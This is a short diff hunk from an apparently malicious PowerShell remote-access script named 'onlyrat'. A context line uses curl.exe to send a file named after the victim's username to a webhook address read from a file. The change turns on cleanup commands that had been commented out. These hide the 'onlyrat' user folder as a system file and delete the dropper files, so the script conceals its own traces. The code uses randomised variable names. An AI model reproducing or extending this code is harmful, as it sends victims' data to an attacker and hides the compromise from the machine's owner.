@@ -57,7 +57,7 @@ $PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
 Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"
 
 # cleanup
-#attrib +h +s +r C:/Users/onlyrat 
-#Remove-Item $CRYnrkaDbe
-#Remove-Item lawFvVTikZ.txt
-#Remove-Item KFPGaEYdcz.ps1
+attrib +h +s +r C:/Users/onlyrat 
+Remove-Item $CRYnrkaDbe
+Remove-Item lawFvVTikZ.txt
+Remove-Item KFPGaEYdcz.ps1
